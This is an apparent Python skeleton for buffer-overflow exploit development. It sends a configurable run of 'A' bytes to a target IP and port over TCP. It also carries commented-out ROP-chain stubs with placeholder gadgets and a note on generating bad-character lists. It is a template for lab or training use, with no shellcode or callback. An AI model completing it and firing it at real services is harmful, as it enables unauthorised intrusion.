#!/usr/bin/env python3
# exploit_template.py --
# @dualfade

# gen bad chars --
# pip install badchars
# badchars -f python | sed 's/^\s*\"./\tb"\\/g' \
# xclip -selection clipboard

# skel refs --
# https://bit.ly/3KIIjzz --

import socket
import sys
import logging
from optparse import OptionParser

# logging options -- 
logger = logging.basicConfig(format='%(asctime)s - %(message)s',
                    datefmt='%d-%b-%y %H:%M:%S',
                    level=logging.INFO)

# from struct import pack

# defs --
# def eip_chain():
#     """ eip rop chain function -- """

#     gadgets = [
#         0xffffffff,         # ;
#         0xffffffff,         # ;
#         0xffffffff,         # ;
#     ]

#     # return eip --
#     return b''.join(pack('<L', _) for _ in gadgets)

# def rop_chain():
#     """ main rop chain function -- """

#     gadgets = [
#         0xffffffff,         # ;
#         0xffffffff,         # ;
#         0xffffffff,         # ;
#     ]

#     # return eip --
#     return b''.join(pack('<L', _) for _ in gadgets)

def payload_send():
    """ send payload function -- """

    # args --
    length = str(options.length)

    try:
        # initial \x41 payload --
        buf = b"\x41" * int(length)
        sock_connect(buf)

    except OSError as err:
        logging.error(err)

def sock_connect(buffer):
    """ socket connect function --"""

    try:
        # args --
        port = int(options.port)
        target = str(options.target)

        logging.info("[info] sending tcp://%s:%s => %s\n" % (target, port, buffer))
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('%s' % target, port))
        s.send(buffer)

        # get resp --
        resp = s.recv(1024)
        logging.info('[info] resp => %s' % resp)

        # finally close socket; ret resp --
        s.close()

    # except --
    except OSError as err:
        error(err)

def error(err):
    """ standard error message -- """

    logging.error('[err] application error %s' % err)
    logging.error('[err] exiting now.')
    sys.exit(-1)

def script_usage():
    """ usage; simple examples -- """
    print('[usage]')
    print('python exploit.py -h')
    print('python exploit.py -t 192.168.1.222 -p 31337')
    print('python exploit.py -t 192.168.1.222 -p 31337 -l 2000\n')

# main --
if __name__ == "__main__":
    """ main function args -- """

    # parser opts --
    parser = OptionParser()
    parser.add_option('-t', '--target', dest='target', help='target ip address')
    parser.add_option('-p', '--port', dest='port', help='target port')
    parser.add_option('-l', '--length', type='int', default='0',
                      help='payload length, required = false, default 0')
    try:
        (options, args) = parser.parse_args()
        if (options.target == None):
            script_usage()
            error('=> missing input')

        else:
            logging.info('[info] starting exploit')
            payload_send()
            sys.exit(-1)
    except SystemExit:
        sys.stdout.write("\n")
        sys.stdout.flush()



#__eof__
